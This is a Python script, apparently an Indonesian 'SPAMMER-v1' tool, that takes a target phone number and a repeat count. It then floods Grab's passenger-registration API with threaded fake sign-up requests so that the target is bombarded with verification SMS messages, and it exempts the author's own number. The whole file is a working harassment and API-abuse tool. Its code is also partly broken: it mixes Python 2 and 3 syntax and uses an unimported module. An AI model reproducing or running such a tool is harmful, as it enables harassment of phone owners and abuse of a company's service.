#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by KANG-NEWBIE

blue="\033[1;34m";
cyan="\033[1;36m";
okegreen="\033[92m";
lgreen="\033[1;32m";
white="\033[1;37m";
purple="\033[1;35m";
red="\033[1;31m";
yellow="\033[1;33m";

"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""
from multiprocessing.pool import ThreadPool
try:
	import sys
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("\n[!] Sepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	ban = """
%s _______  _____  ______ _____
%s/ ______\|     \|  __  |     \   %sAuthor : MR.0KING
%s| |   __ |  |)  | |  | |  |)  |  %sTeam   : Dark Force Army
%s| |  |_ ||     /| |__| |     <   %sCode   : Python
%s| |___| ||     ||  __  |  |)  |  %sWhatsapp : 089638787729
%s\_______/|__|__||_|  |_|_____/   %sGithub : Ardi28
           %sSPAMMER-v1
	"""%(lgreen,lgreen,red,lgreen,red,lgreen,red,lgreen,red,lgreen,red,lgreen)
	print ban
	no = input("%s[?] NOMOR ( ex : 628xxxxx ) =>\033[1;36m "%(white))
	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
	if no == 6289638787729 or no == +6289638787729:
		print "%s[!] Tidak Semudah Itu Ferguso "%(red)
		print ""
		sys.exit()
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print ""
b = []
print("[*] HASIL :")
print " "
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SEND SUKSES")
			c = "c"
			b.append(c)
			c = c+c
			time.sleep(1)
		else:
			print("\033[1;31m[-] SEND GAGAL")
	except:
		pass


jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
if (len(b)) == 0:
        print "\n%s[!] Pastikan Jaringan Anda"%(red)
        print "%s[!] Pastikan Nomor Tidak Salah"%(red)
	print "[!] Tunggu Berapa Menit "
        print white
        sys.exit()
print("%s========================[ STOPPED ]========================"%(cyan))
print " "
